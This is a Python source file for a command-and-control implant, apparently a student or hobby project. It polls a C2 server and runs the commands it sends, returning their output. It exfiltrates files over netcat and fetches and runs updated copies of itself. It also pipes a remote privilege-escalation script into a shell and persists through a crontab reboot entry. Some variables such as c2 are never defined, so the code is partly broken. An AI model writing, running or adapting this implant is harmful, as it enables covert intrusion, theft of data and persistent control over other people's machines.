import urllib.request
import urllib
import os
import time
import subprocess
import sys

#Comms
implantDir = os.getcwd()

#This will upload a file to the target server.
def ExfilFile(file, c2, IPAddress):
    filename = file.rsplit('/', 1)[-1]
    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={filename}')
    os.system(f'nc -q1 -w5 {IPAddress} 1234 < {file}')
    return

#This will download the new version of the implant, and then run it as a subprocess.
def UpdateImplant(implantDir):
    os.chdir(implantDir)
    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', f'{implantDir}/implant.py')
    subprocess.Popen([sys.executable, f'{implantDir}/implant.py'])
    return

#This will self destruct our implant.
def SelfDestruct(implantDir):
    #urllib.request.urlopen(f'{c2}/destruct?sid={sid}')
    os.system(f'crontab -l | grep -v "{implantDir}implant.py"  | crontab -')
    os.system(f'rm {implantDir}/sid.log; rm {implantDir}/implant.py')
    destructMsg = urllib.parse.quote_plus("Implant has self destructed")
    urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
    return

#Will create a path similarily to the way linux cd does given a string consisting of .., and directories seperated by '/'.
def MakePath(dir):
    path = dir.split('/')
    tempCWD = os.getcwd()
    for dir in path:
        if dir == '..':
            tempCWD = tempCWD.rsplit('/',1)[0]
        else:
            tempCWD = f'{tempCWD}/{dir}'
    return tempCWD

#Changes the directory similarily to the way linux cd does given a string consisting of .., and directories seperated by '/'.
def ChangeDir(cwd, newDir):
    newWD = MakePath(newDir)
    if os.path.isdir(newWD):
        cwd = os.getcwd()
        os.chdir(newWD)
        if cwd != os.getcwd():
            dirMsg = urllib.parse.quote_plus(f'New working directory: {os.getcwd()}')
            urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
        else:
            dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {newWD}')
            urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
    else:
        dirMsg = urllib.parse.quote_plus(f'Failed to change directory: {newWD}')
        urllib.request.urlopen(f'{c2}/info?info={dirMsg}&sid={sid}')
    return

def CommandExec(command):
    #command = urllib.request.urlopen(f'{c2}/retrcommand?sid={sid}').read().decode("utf-8")
    os.system(command) #runs the command from our C2 server on the target
    commanddata = os.popen(command)
    commanddatatext = urllib.parse.quote_plus(commanddata.read())

    #Send command output to C2
    urllib.request.urlopen(f'{c2}/info?info={commanddatatext}&sid={sid}')
    return

def PrivEsc(implantDir):
    os.system(f'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh > {implantDir}/linpeas.txt')
    ExfilFile(f'{implantDir}/linpeas.txt', c2, c2IPAdress)
    os.system(f'rm {implantDir}/linpeas.txt')
    return

def Cron():
    os.system(f'echo "@reboot /usr/bin/python3 {implantDir}/implant.py" > text.txt');
    os.system(f'crontab {implantDir}/text.txt')
    os.system(f'rm {implantDir}/text.txt')
    return

#initialiazation, this will set establish a Session ID
if(os.path.isfile("sid.log")):
    sid = open('sid.log', "r").read()
    dir = urllib.parse.quote_plus(os.getcwd())
    urllib.request.urlopen(f'{c2}/reconnect?sid={sid}&cwd={dir}')
else:
    dir = urllib.parse.quote_plus(os.getcwd())
    sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
    f = open("sid.log", "w")
    f.write(sid)
    f.close()

while True:
    next = urllib.request.urlopen(f'{c2}/next?sid={sid}').read().decode("utf-8")
    if next == 'wait':
        time.sleep(10)
    else:
        next = next.split(' ', 1)
        if next[0] == 'cexe':
            CommandExec(next[1])
        elif next[0] == 'cd':
            ChangeDir(os.getcwd(), next[1])
        elif next[0] == 'update':
            UpdateImplant(implantDir)
        elif next[0] == 'exfil':
            ExfilFile(next[1], c2, c2IPAdress)
        elif next[0] == 'privesc':
            PrivEsc(implantDir)
        elif next[0] == 'cron':
            Cron()
        elif next[0] == 'selfdestruct':
            SelfDestruct(implantDir)
            break
        else:
            time.sleep(10)
        time.sleep(5)
